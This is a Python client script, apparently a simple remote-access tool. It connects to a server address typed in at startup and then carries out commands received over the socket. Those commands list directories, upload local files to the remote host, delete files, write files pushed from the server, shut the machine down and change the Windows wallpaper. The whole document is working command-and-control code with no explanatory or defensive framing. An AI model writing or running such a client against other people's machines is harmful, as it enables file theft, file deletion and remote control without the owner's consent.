import os
import socket
import ctypes

s = socket.socket()
#port = 19493
host = input("Please enter the server address: ")
port = input("Please enter the port address: ")
s.connect((host,int(port)))
print("")
print("Connected to the server successfully")
print("")

while 1:
    command = s.recv(1024)
    command = command.decode()
    print("Command recieved")
    print("")
    if command == "view_cmd":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        print("Command has been executed successfully..")

    elif command == "custom_dir":
        #print("Custom dir")
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        print("")
        print("Command has been executed successfully..")
        print("")

    elif command == "download_file":
        file_path = s.recv(5000).decode()
        try:
            with open(file_path,"rb") as f:
                while True:
                    data=f.read(4096)
                    if not data:
                        break
                    s.send(data)
            s.send(b"[END_OF_FILE]")
            print("File has been sent successfully")
        except FileNotFoundError:
            s.send(b"[ERROR] File not Found.")

    elif command == "remove_file":
        fileanddir = s.recv(6000)
        fileanddir = fileanddir.decode()
        os.remove(fileanddir)
        print("")
        print("Command has been executed successfully")
        print("")

    elif command == "send_files":
        filename = s.recv(6000).decode()

        file_data = b""
        while True:
            chunk = s.recv(4096)
            if b"[END_OF_FILE]" in chunk:
                file_data += chunk.replace(b"[END_OF_FILE]",b"")
                break
            file_data += chunk

        with open(filename,"wb") as new_file:
            new_file.write(file_data)
        print(f"{filename} received and savedvsuccessfully.")

    elif command == "sleep":
        os.system("shutdown /s /t 1")

    elif command == "change_desktop":
        file_image = s.recv(6000)
        file_image = file_image.decode()
        print(file_image)
        wallpaper_style = 0
        SPI_SETDESKWALLPAPER = 20
        image = ctypes.c_wchar_p(file_image)
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image, wallpaper_style)


    else:
        print("")
        print("Command not recoonised")